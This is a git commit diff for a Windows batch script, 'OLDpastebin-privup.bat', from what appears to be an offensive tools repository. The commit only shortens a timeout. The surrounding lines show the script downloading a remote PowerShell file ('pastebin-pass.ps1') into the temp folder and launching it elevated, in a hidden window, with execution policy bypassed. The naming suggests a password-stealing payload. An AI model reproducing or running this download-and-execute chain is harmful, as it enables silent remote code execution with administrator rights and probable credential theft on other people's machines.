aa0e7b151a4af5e6d5e029303650af0ad0f8f033
cyb1l <60405884+4V4loon@users.noreply.github.com>
2022-05-19 20:19:29 +0400

    Update OLDpastebin-privup.bat

--- pastebin/OLDpastebin-privup.bat
+++ pastebin/OLDpastebin-privup.bat
@@ -5,5 +5,5 @@ IF %ERRORLEVEL% EQU 0 ( goto :run ) else ( goto :while )
 
 :run
 powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/pastebin-pass.ps1' -UseBasicParsing -OutFile $env:tmp\pass.ps1"
-timeout /t 7
+timeout /t 3
 powershell -command "start-process PowerShell.exe -ArgumentList 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $env:tmp\pass.ps1' -WindowStyle Hidden -Verb RunAs"
